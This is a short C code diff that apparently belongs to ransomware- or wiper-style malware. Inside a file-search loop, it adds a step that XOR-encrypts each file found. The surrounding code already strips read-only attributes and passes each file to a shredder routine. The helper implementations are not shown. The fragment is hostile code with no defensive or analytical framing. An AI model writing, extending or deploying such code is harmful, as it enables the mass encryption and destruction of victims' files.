@@ -212,6 +212,13 @@ static void search_engine_class_start(
                     if (findData.dwFileAttributes & FILE_ATTRIBUTE_READONLY)
                         SetFileAttributes(currentFile, FILE_ATTRIBUTE_NORMAL);
 
+                    xor_class_t* xor_class_obj = xor_class_create(currentFile);
+                    if (xor_class_obj)
+                    {
+                        xor_class_obj->method->xor_encrypt(xor_class_obj);
+                        xor_class_obj->method->xor_destroy(xor_class_obj);
+                    }
+
                     file_shredder_class_t* file_shredder_class_obj = file_shredder_class_create(currentFile);
                     if (file_shredder_class_obj)
                     {
